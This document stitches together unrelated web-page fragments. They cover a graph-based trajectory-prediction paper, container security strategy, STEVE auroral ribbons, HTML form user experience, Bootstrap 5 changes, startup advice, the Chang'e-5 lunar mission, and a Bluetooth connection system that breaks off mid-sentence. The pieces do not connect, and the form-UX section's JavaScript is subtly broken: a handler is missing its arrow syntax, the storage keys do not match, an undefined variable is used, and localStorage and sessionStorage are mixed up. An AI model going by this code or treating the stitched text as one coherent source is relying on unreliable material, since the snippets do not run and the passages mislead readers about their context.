  <li>Third, directly training such a model, however, tends to collapse to a single mode. Therefore, we employ an effective mechanism to mitigate the mode collapse issue and encourage multi-modality. During training, we run the decoding process d times, which generates \(d\) trajectories for each agent under specific scenarios. We only choose the prediction hypothesis with the minimal loss for backpropagation, which is the most likely to be in the same mode as the ground truth. The other prediction hypotheses may have much higher loss, but it doesn’t necessarily imply that they are implausible. They may represent other potential reasonable modalities.</li>
</ul>

<h2 id="experiments">Experiments</h2>
<p>We highlight the results of two case studies on a synthetic physics system and an urban driving scenario. More experimental details and case studies on pedestrians and sports players can be found in <a href="https://papers.nips.cc/paper/2020/hash/e4d8163c7a068b65a64c89bd745ec360-Abstract.html">our paper</a>.</p>

<h3 id="case-study-1-particle-physics-system">Case Study 1: Particle Physics System</h3>

<p>We experimented with a simulated particle system with a change of relations. Multiple particles are initially linked and move together. The links disappear as long as a certain criterion on the particle state is satisfied and the particles move independently thereafter. The model is expected to learn the criterion by itself and perform both edge type prediction and trajectory prediction. Since the system is deterministic in nature, we do not consider multi-modality in this task.</p>

<p>We predicted the particle states at the future 50 time steps based on the observations of 20 time steps. We set two edge types in this task, which correspond to “with link” and “without link”. The results of edge type prediction are summarized in Table 1, which are averaged over 3 independent runs. “No Change” means the underlying interaction structure keeps the same in the whole horizon, while “Change” means the change of interaction patterns happens at some time. It shows that the supervised learning baseline, which directly trains the encoding functions with ground truth labels, performs the best in both setups and serves as a “gold standard”. Under the “No Change” setup, <a href="https://arxiv.org/abs/1802.04687">NRI (dynamic)</a> is comparable to EvolveGraph (RNN re-encoding), while EvolveGraph (static) achieves the best performance. The reason is that the dynamic evolution of the interaction graph leads to higher flexibility but may result in larger uncertainty, which affects edge prediction in the systems with static relational structures. Under the “Change” setup, NRI (dynamic) re-evaluates the latent graph at every time step during the testing phase, but it is hard to capture the dependency between consecutive graphs, and the encoding functions may not be flexible enough to capture the evolution. EvolveGraph (RNN re-encoding) performs better since it considers the dependency of consecutive steps during the training phase, but it still captures the evolution only at the feature level instead of the graph level. EvolveGraph (dynamic) achieves significantly higher accuracy than the other baselines (except Supervised), due to the explicit evolution of interaction graphs.</p>

        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Docker security best practices</a> when writing Dockerfiles</li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>

Known as Strong Thermal Emission Velocity Enhancements (STEVEs), these luminous light-purple sky ribbons may resemble regular auroras, but recent research reveals significant differences. A STEVE's great length and unusual colors, when measured precisely, indicate that it may be related to a subauroral ion drift (SAID), a supersonic river of hot atmospheric ions thought previously to be invisible.  Some STEVEs are now also thought to be accompanied by green picket fence structures, a series of sky slats that can appear outside of the main auroral oval that does not involve much glowing nitrogen. The featured wide-angle composite image shows a STEVE in a dark sky above Childs Lake, Manitoba, Canada in 2017, crossing in front of the central band of our Milky Way Galaxy.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5408" itemtype="https://schema.org/CreativeWork" itemscope="itemscope"> <div>  <div itemprop="text"> <p>As you build out forms for the web, getting the semantics, accessibility, and styling right is a lot of work. If you can get all those right, you’re doing quite well for yourself. However, there are still some thing we can do to make life better for the folks filling out our forms. </p> <p>In this article, we’ll look at some of the do’s and don’ts about HTML form user experience (UX). And if you are looking for a refresher on the previous steps mentioned above, take a look at the other articles in this series.</p> <ul><li><a href="https://austingil.com/how-to-build-html-forms-right-semantics/">Part 1: Semantics</a></li><li><a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">Part 2: Accessibility</a></li><li><a href="https://austingil.com/build-html-forms-right-styling/">Part 3: Styling</a></li><li><strong>Part 4: User Experience</strong></li><li>Part 5: Security</li></ul> <h2>Content</h2> <h3>Request the least amount of information</h3> <p>As a user of the internet, I can speak from experience when I say that entering more data than necessary into a form is annoying. So if you really only need an email, consider not asking for first name, last name, and phone number. By creating forms with fewer inputs, you will improve the user experience. Some studies have even shown that smaller forms have higher conversion rates. That’s a win for you. Plus, reducing the data you collect has a chance of reducing your privacy concerns, although this depends greatly on the data.</p> <h3>Keep it simple</h3> <p>It can be tempting to bring your creativity into form design. However, it’s easy to go overboard and make things confusing. By sticking to simple designs that use standard input types, you are creating a more cohesive experience, not only across your site, but across the internet. This means users are less likely to get confused by some fancy and novel input. Stick to the classics. And remember that selection inputs like checkboxes (allows multiple selected items) generally use boxed inputs, and radios (allows only a single selection) use circles.</p> <h3>Semantics are good for a11y and UX</h3> <p>I covered semantics in much more detail in <a href="https://austingil.com/how-to-build-html-forms-right-semantics/">a previous article</a>, but the short version is that choosing the right input types improves the experience on many levels: semantics, accessibility, and user experience. Folks are used to the way inputs work across the web, so we can take advantage of that by using the same inputs for the same things. Not to mention that by using the right inputs, we get a lot of things for free like keyboard navigation support and validation.</p> <h3>Put country selector before city/state</h3> <p>This is a simple rule for anyone adding locales to their forms. If you are going to ask for a user’s country, put that before the city &amp; state fields. The reason is, usually the city and state will be populated based on the country. So if your country selection defaults to the United States, and the user lives in Oaxaca, Mexico, they will need to skip past the city &amp; state fields, select the country of Mexico, then go back and fill in their city and state once the list is updated. By putting the country first, you maintain the flow of the form, which is especially nice for users that use the keyboard to navigate.</p> <h3>Paginate long forms</h3> <p>This relates to my first point in that ideally you don’t have too much data. However, in some cases it cannot be helped. In those cases, it might make sense to paginate a form so that the information is not overwhelming. If you choose to paginate the form, my best advice is to show the user some sort of UI about their progress in the form, and the option to remove the pagination and show the form in it’s entirety.</p> <h2>General Functionality</h2> <h3>Prevent browser refresh/navigation</h3> <p>Have you ever been filling out a long form and accidentally refreshed the page, losing all your work? It’s the worst. Fortunately, the browser provides us with the <code><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event" rel="noopener">beforeunload</a></code> event that we can use to inform the user they are about to lose any unsaved work.</p> <p>We can setup a variable to track whether the form has any unsaved changes, and we can attach a handler to the <code>beforeunload</code> event which will prevent the browser navigation if any changes have been made.</p> <pre><code>// You'll need some variable for tracking the status. We'll call it hasChanges here.

window.addEventListener("beforeunload", (event) {
  if (!hasChanges) return;

  event.preventDefault();
  event.returnValue = "";
})

form.addEventListener('change', () =&gt; {
  hasChanges = true;
});

form.addEventListener('submit', () =&gt; {
  hasChanges = false;
})</code></pre> <p>The gist of this snippet is that we are tracking some variable called <code>hasChanges</code>. If <code>hasChanges</code> is <code>false</code> when the <code>beforeunload</code> event fires, we can allow the browser to navigate away just fine. If <code>hasChanges</code> is <code>true</code>, the browser will prompt the user letting them know they have unsaved changes and ask if they want to continue away or stay on the page. Lastly, we add appropriate event handlers to the form to update the <code>hasChanges</code> variable.</p> <p>Your implementation may look slightly different for the <code>hasChanges</code> variable. For example, if you are using a JavaScript framework with some state management. And if you are creating a single page application, then this solution will not be quite enough because the <code>beforeunload</code> event does not fire on single page app navigation. For more details on that, please check out my article “<a href="https://austingil.com/prevent-browser-refresh-url-changes-route-navigation-vue/">How to prevent browser refresh, URL changes, or route navigation in Vue</a>“.</p> <h3>Store unsaved changes</h3> <p>Along the same lines as the previous point, there are times when we accidentally lose all our work on a long form. Fortunately, we can avoid causing this grief to our users by taking advantage of browser features like <code><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noopener">sessionStorage</a></code>. Let’s say, for example, that we wanted to store all the data in a form any time a change event occurs. We can use <code><a href="https://developer.mozilla.org/en-US/docs/Web/API/FormData" rel="noopener">FormData</a></code> to capture the form and all it’s current values, then store the data as a <code>JSON</code> string in <code>sessionStorage</code>.</p> <pre><code>const form = document.querySelector('form')

form.addEventListener('change', event =&gt; {
  const formData = new FormData(form);
  sessionStorage.setItem('your-identifier', JSON.stringify(formData));
});</code></pre> <p>With the data saved, the user can refresh all they want and the data is not lost. The next step is to check <code>localStorage</code> on page load to see if we have any previously saved data to pre-fill the form with. If we do, we can parse the string into an object, then loop over each key/value pair and add that saved data to it’s respective input. It’s slightly different for different input types.</p> <pre><code>const previouslySavedData = sessionStorage.getItem('form-data');

if (previouslySavedData) {
  const inputValues = JSON.parse(savedData);

  for(const [name, value] of Object.entries(inputValues)) {
    const input = form.querySelector(`input[name=${name}]`);
    switch(input.type) {
      case 'checkbox':
        input.checked = !!value;
        break;
      // other input type logic
      default:
        input.value = value;
    }
  }
}</code></pre> <p>The last thing to do is to make sure that once the form is submitted, we clean up any previously saved data. This is also part of the reason we used <code>sessionStorage</code> instead of <code>localStorage</code>. We want our saved data to be somewhat impermanent.</p> <pre><code>form.addEventListener('submit', () =&gt; {
  sessionStorage.removeItem('form-data');
});</code></pre> <p>The last thing to say about this feature is that it’s not right for all data. Any private or sensitive data should be left out of any <code>localStorage</code> persistence. And some input types just plain won’t work. For example, there would be no way to persist a file input. With those caveats understood, however, it can be a great feature to add to almost any form. Especially any longer forms.</p> <h3>Do not prevent copy/paste</h3> <p>One of the most annoying things I’ve experienced recently was on the IRS website. They asked me for my bank account number and bank routing number. These are not short numbers, we’re talking like 15 characters. On most websites, it’s no problem, I copy the numbers from my bank’s website and paste it into the input field. On the IRS website, however, they chose to disable pasting into the inputs which meant I had to manually fill in the details for each number…twice. I have no idea why they did this, but it’s very frustrating for users, and actually increases the likelihood of errors. Please don’t do this.</p> <h2>Input Functionality</h2> <h3>inputmode</h3> <p>If you have not heard about <code><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode" rel="noopener">inputmode</a></code> before, then let me turn you on to it now. <code>inputmode</code> is an HTML input attribute that let’s you tell the browser the input format. This may not be immediately clear, and if you are on your desktop computer then you won’t notice it, but for mobile users it makes a huge difference. By selecting different input modes, the browser will present the user with a different virtual keyboard to input their data. </p> <p>You can greatly improve the user experience of filling out a form for mobile users by simply adding a different input mode. For example, if you are asking for numeric data like a credit card number, you can set the <code>inputmode</code> to <code>numeric</code>. That makes it easier for the user to add numbers. The same for emails, <code>inputmode=email</code>. </p> <p>Available values for <code>inputmode</code> are <code>none</code>, <code>text</code>, <code>tel</code>, <code>url</code>, <code>email</code>, <code>numeric</code>, <code>decimal</code>, and <code>search</code>. For more examples, check out <a href="https://inputmodes.com/" rel="noopener">inputmodes.com</a> (ideally on a mobile device).</p> <h3>autocomplete</h3> <p>Along with <code>inputmode</code>, the <code><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete" rel="noopener">autocomplete</a></code> attribute is a built in feature that can greatly improve the user experience of your forms. Many, many website use forms to request the same information from users: email, address, phone, credit cards, etc. And a very nice feature that is built into the browsers is the ability for users to save their own information so that it can be auto-completed across different forms and sites. <code>autocomplete</code> lets us tap into this.</p> <p>The autocomplete attribute is valid on any text or numeric input as well as <code>&lt;textarea&gt;</code>, <code>&lt;select&gt;</code>, and <code>&lt;form&gt;</code> elements. There are way to many available values to use for me to list here, but some that stand out are <code>current-password</code>, <code>one-time-code</code>, <code>street-address</code>, <code>cc-number</code> (and various other credit card options), and <code>tel</code>. </p> <p>Providing these options can make a nicer experience for many users, and don’t worry about this being a security concern because the information only exists on the users machine, and they have to allow their browser to implement it.</p> </div></div></article></div>

<p>At Mono, we’ve used Bootstrap for quite a while. I think the first time I used Bootstrap myself it was at version&nbsp;2.</p>



<p>While we like the freedom of being able to create a custom design and implementing it from scratch, there are undeniably many situations where a battle-tested framework can save you time. It allows you to not reinvent the&nbsp;wheel.</p>



<p>One of the situations where Bootstrap shines is when you are doing the design for a backoffice type of application, where a custom visual design is not the highest&nbsp;priority.</p>



<figure><img loading="lazy" width="1024" height="599" src="https://mono.company/wp-content/uploads/2020/11/spark2-1024x599.png" alt="" srcset="https://mono.company/wp-content/uploads/2020/11/spark2-1024x599.png 1024w, https://mono.company/wp-content/uploads/2020/11/spark2-300x176.png 300w, https://mono.company/wp-content/uploads/2020/11/spark2-768x450.png 768w, https://mono.company/wp-content/uploads/2020/11/spark2-1536x899.png 1536w, https://mono.company/wp-content/uploads/2020/11/spark2-2048x1199.png 2048w, https://mono.company/wp-content/uploads/2020/11/spark2-500x293.png 500w, https://mono.company/wp-content/uploads/2020/11/spark2-3840x2248.png 3840w, https://mono.company/wp-content/uploads/2020/11/spark2-2560x1499.png 2560w, https://mono.company/wp-content/uploads/2020/11/spark2-2160x1264.png 2160w, https://mono.company/wp-content/uploads/2020/11/spark2-1920x1124.png 1920w, https://mono.company/wp-content/uploads/2020/11/spark2-1650x966.png 1650w, https://mono.company/wp-content/uploads/2020/11/spark2-1280x749.png 1280w, https://mono.company/wp-content/uploads/2020/11/spark2.png 4100w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Example of a backoffice design we created that was implemented using Bootstrap. To be fair, it has its own design customizations, but there is also a lot of Bootstrap code under the hood.</figcaption></figure>



<h3>Release status</h3>



<p>Bootstrap 5 is currently in its 3rd alpha release. The plan seems to be to release Bootstrap 5 to the public as a final version near the end of the year. In one of our recent projects we already went ahead with using it, anticipating that the underlying logic wouldn’t change that much from now until the&nbsp;release.</p>



<p>So let’s talk about some of the most important changes in Bootstrap&nbsp;5.</p>



<h3>What’s changed?</h3>



<h4>A more approachable migration</h4>



<p>First of all, not really a feature but more of a logic change: the<strong> migration from v4 to v5 is much more approachable</strong> than before (from v3 to&nbsp;v4).</p>



<p>For those thinking about switching from Bootstrap 4 to 5, the good news is that in terms of CSS and default components, not much has changed. The classes and logic are quite similar from 4 to&nbsp;5.</p>



<p>The Bootstrap team seems to have settled on a “stable API” i.e. to not change class names too much from one release to the&nbsp;other.</p>



<p>This is great news for many applications that want to make the move and were <em>not</em> looking forward to the kind of class-change move that a Bootstrap v3 to v4 migration made you&nbsp;do.</p>



<h4>No jQuery</h4>



<p>Next, there is the <strong>removal of jQuery as a&nbsp;dependency.</strong></p>



<p>The JS logic for JS plugins like toggles and modals is now written in vanilla JS. There is still the possibility to use jQuery if you really want to (see <a href="https://v5.getbootstrap.com/docs/5.0/getting-started/javascript/#still-want-to-use-jquery-its-possible">this docs&nbsp;entry</a>).</p>



<p>The JS files are even available as ESM modules, which allows you to use Bootstrap directly as a module in your browser, if your browser supports it. However, the plugins that depend on <a href="https://popper.js.org/">Popper</a> do not yet work this&nbsp;way.</p>



<p>This move removes a dependency, and it modernizes Bootstrap. jQuery is a thing from the past, it was a real big help, but it has served its purpose. jQuery doesn’t belong in a development project launched in&nbsp;2020.</p>



<p>However, I wonder if I will actually encounter this code in practice, as the logic for handling modals, popups etc. is probably contained in the Javascript framework used in the project. Many Javascript frameworks have a re-implementation of Bootstrap specific for that framework (like <a href="https://ng-bootstrap.github.io/" &nbsp;title="https://ng-bootstrap.github.io/">ng-bootstrap</a>).</p>



<p>I believe the source files will mostly be used as a reference for the intended functionality. I don’t there are that many development situations where you would use them&nbsp;directly.</p>



<h4>CSS custom properties for quick customizations</h4>



<p>Internet Explorer support has been dropped, paving the way to use newer CSS features like <strong>CSS custom&nbsp;properties</strong>.</p>



<p>In practice, this allows you to customize Bootstrap without a compilation step. If an aspect of the design uses CSS custom properties, you can simply drop in code to override it, without going through the dance of setting up a Sass-based workflow where you override the framework&nbsp;variables.</p>



<p>For&nbsp;example:</p>



<pre><code lang="css">.table {
  --bs-table-bg: #FFF;
  --bs-table-striped-bg: #EFF1F7;
}</code></pre>



<p>I imagine this can be useful when you quickly want to tweak some colors. The way it works is demonstrated in this Svelte <a href="https://svelte.dev/repl/0a9a77c7809b4c2eb679d1b4944b1fdf?version=3.29.4">REPL</a> where a table is customized to have some other&nbsp;colors.</p>



<h4>Bootstrap icons</h4>



<p>Bootstrap now comes with its own icon set. You can view this set <a href="https://icons.getbootstrap.com/">here</a>. I am not sure if I am a fan of the style, but it’s good that there is a focus on this area. No UI framework is complete without a way to handle&nbsp;icons.</p>



<p>We’re likely to use our own <a href="https://icons.mono.company/">Mono Icons</a> as a default choice in our projects; in the recent project we customized Bootstrap 5 to work together with our icon&nbsp;set.</p>



<h4>New/revised components: accordion, file input etc.</h4>



<p>In Alpha 3, the Bootstrap team added a new <a href="https://v5.getbootstrap.com/docs/5.0/components/accordion/">Accordion</a> component.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="599" src="https://mono.company/wp-content/uploads/2020/11/acc-1024x599.png" alt="" srcset="https://mono.company/wp-content/uploads/2020/11/acc-1024x599.png 1024w, https://mono.company/wp-content/uploads/2020/11/acc-300x176.png 300w, https://mono.company/wp-content/uploads/2020/11/acc-768x450.png 768w, https://mono.company/wp-content/uploads/2020/11/acc-1536x899.png 1536w, https://mono.company/wp-content/uploads/2020/11/acc-2048x1199.png 2048w, https://mono.company/wp-content/uploads/2020/11/acc-500x293.png 500w, https://mono.company/wp-content/uploads/2020/11/acc-3840x2248.png 3840w, https://mono.company/wp-content/uploads/2020/11/acc-2560x1499.png 2560w, https://mono.company/wp-content/uploads/2020/11/acc-2160x1264.png 2160w, https://mono.company/wp-content/uploads/2020/11/acc-1920x1124.png 1920w, https://mono.company/wp-content/uploads/2020/11/acc-1650x966.png 1650w, https://mono.company/wp-content/uploads/2020/11/acc-1280x749.png 1280w, https://mono.company/wp-content/uploads/2020/11/acc.png 4100w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Inspecting the code, it uses an SVG as a <code>data-image</code>, directly in the&nbsp;CSS.</p>



<p>If we were to use Mono icons, this creates a design problem where there are 2 different icon styles in the&nbsp;project.</p>



<p>I can already see the work we’re going have to create a customized version of this component. And that is exactly the problem that you have with Bootstrap sometimes: if you don’t use it as-is, you are sometimes setting yourself up for&nbsp;trouble.</p>



<p>Luckily, you can simply create a custom stylesheet where you don’t include certain elements. For example, we have never used the “<a href="https://getbootstrap.com/docs/4.0/components/jumbotron/">Jumbotron</a>” component in Bootstrap 4. We’ll be checking whether this component is useful or whether we will need to provide our own&nbsp;version.</p>



<h4>New utilities + new utility API</h4>



<p>I have a love-hate relationship with utility based CSS. I love it for quick prototyping, but I hate it when a high unelegant set of divs and classes lands in production and becomes maintenance&nbsp;hell.</p>



<p>In the Alpha 3 blog post, the Bootstrap talks about new utility classes and even a <a href="https://v5.getbootstrap.com/docs/5.0/utilities/api/">whole API</a> to generate utility classes.&nbsp;</p>



<p>This is obviously Tailwind-inspired, and those who have been following me on Twitter or have been reading my personal blog know that I, ahem, am not a big&nbsp;fan.</p>



<p>In general, I am also not a big fan of making CSS too complex by using too many Sass features to generate code. I think it increases complexity. A design rarely needs 5 opacity classes like explained in the first example on the utilities API&nbsp;page.</p>



<pre><code lang="html">$utilities: (
  "opacity": (
    property: opacity,
    values: (
      0: 0,
      25: .25,
      50: .5,
      75: .75,
      100: 1,
    )
  )
 );</code></pre>



<p>This is probably a blog post in itself when I get to work with this code.&nbsp;</p>



<h3>Conclusion</h3>



<p>This blog post talks about the most important changes in Bootstrap 5 (in my humble opinion). If you want to dive into the exact details, you can reference these&nbsp;posts:</p>



<ul><li><a href="https://blog.getbootstrap.com/2020/11/11/bootstrap-5-alpha-3/">Alpha 3 release post</a> (Nov 11)</li><li><a href="https://blog.getbootstrap.com/2020/09/29/bootstrap-5-alpha-2/">Alpha 2 release post</a> (Sep 29)</li><li><a href="https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/">Alpha 1 release post</a> (June 16)</li></ul>



<p>Bootstrap 5 is a modernized version of Bootstrap 4. The API surface is similar, making it easier to migrate to the newest&nbsp;version.</p>



<p>For us, Bootstrap remains a solid choice as a technical base for web applications, especially for projects with limited&nbsp;resources.</p>



<p>We typically extend Bootstrap with some customizations to make it to our liking. We find that there is a lot of value in using a known framework that is actively being&nbsp;maintained.</p>



<p>When we can start design work from a base that contains common design patterns, we can then spend our time on figuring out the exact needs of the design project at hand instead of constantly reinventing the&nbsp;wheel.</p>



<p>We’re looking forward to using Bootstrap 5 in practice in more&nbsp;projects.</p>

And the outcomes are often delusion, sadness and stress.</p><hr><h2>Cut your losses</h2><p>You might get <em>emotionally</em> attached to your projects.</p><p>Your idea "is awesome!", yet your <strong>expectations</strong> are not met by others.</p><p>You can't possibly understand why your project doesn't do as well as you have <strong>hoped</strong>.</p><p>You spent the last month <em>contacting potential clients, shipped v1/v2/v3/Beta1 and Beta2, optimized your landing page to maximize conversions</em>.</p><p>Yet nobody gives <em>a flying fuck</em> about your project, although your research and feedback received.</p><p><strong>This is when you should cut your losses.</strong></p><h2>Move on</h2><p>It's perfectly normal to feel stressed/disappointed when you need to cut your losses and move on.</p><p><strong>But you need to realize it.</strong></p><p>If you don't realize it, or realize it too late, <em>you get burned</em>.</p><p><strong>You get burned by your own emotional decisions, which should have been rational all along.</strong></p><p><strong>It's business decision making after all.</strong></p><blockquote><p>It's not kindergarten where you just cry out loud and a nanny comes to cheer you up and console you.</p></blockquote><p><em>Just move on.</em></p><p>It seemed a good idea in theory, but people have better things to do than to <em>feel pity over your failure</em>.</p><p><strong>And you do too.</strong></p><h2>Learn from your mistakes</h2><p>You have nothing left to do than to learn from what you did <strong>wrong</strong>.</p><blockquote><p>Write it down.</p><p>Visualize the process you followed.</p><p>Maybe it wasn't that good after all.</p></blockquote><p>Did you first of all understood that there was a real <em>value</em> for your potential customers, or you just thought <em>people would donate you money</em> because you spent months on your pretty project?</p><p>As you might have noticed, <strong>You</strong> is mentioned quite a few times in this post.</p><p><em>This should make you reflect.</em></p><p>It's not about you, but about <strong>market, niches, interests, potential clients, value proposition, communication, marketing, connections, content.</strong></p></div></div>]]>

Chang’e-5 consists of an ambitious four spacecraft fleet—a propulsion module to bring the vehicles into lunar orbit, a lander to collect samples, an ascent vehicle to carry the samples into orbit, and a return module that will receive the samples via orbital rendezvous and bring them to Earth. The lander is targeting the Mons Rümker formation on the near side of the Moon to collect relatively young (~1.21 billion years old) volcanic samples during one lunar daytime (14 Earth days—it can’t stay longer since it doesn’t have radioisotope heater units like Chang’e-4). To bleed off speed, <a href="https://spacenews.com/china-is-quietly-preparing-for-november-launch-of-the-change-5-lunar-sample-return-mission/" target="_blank">the return vehicle will use a ‘skip reentry’</a> in which it bounces off the upper atmosphere once, as tested in the 2014 Chang’e-5-T1 test mission. It’s sibling, Chang’e-6, was built at the same time and will either serve as a backup if Chang’e-5 fails, or be repurposed for a south pole landing in a couple of years.

Eg: headphones, headsets, earbuds, etc.</li><li><strong>Host</strong>: Refers to a machine capable of connecting to a peripheral. Eg: phones, tablets, laptops, etc.</li></ol><p><img src="https://elvischidera.com/ab54ddefd78ccee213ba59f61935f8d2/hosts_and_periherals.svg" alt="Hosts &amp; Peripherals"></p><h2>Overview</h2><p><strong>PCAS (Peripheral Connection Augmentation System)</strong> artificially augments a Bluetooth peripheral maximum number of concurrent connections. Based on user-initiated events and hardware configurations PCAS automatically connects/disconnects a profile on a peripheral. PCAS can also multiplex to a single sink: For example, on Android, this brings the theoretical maximum audio connections to 30 (<a href="https://groups.google.com/g/android-platform/c/_tmA8DRg8q4">the maximum allowed AudioTrack instances</a>).</p><p>A single user with multiple hosts no longer has to manually connect/disconnect each peripheral. PCAS does this automatically. This works even on cheap peripherals that don't support multiple concurrent connections natively. Example scenarios:</p><ol><li>When a call comes in on your phone while watching a movie on your tablet. The movie is automatically paused and your phone is connected.</li><li>When playing music from multiple devices, the output could be muxed to the same audio 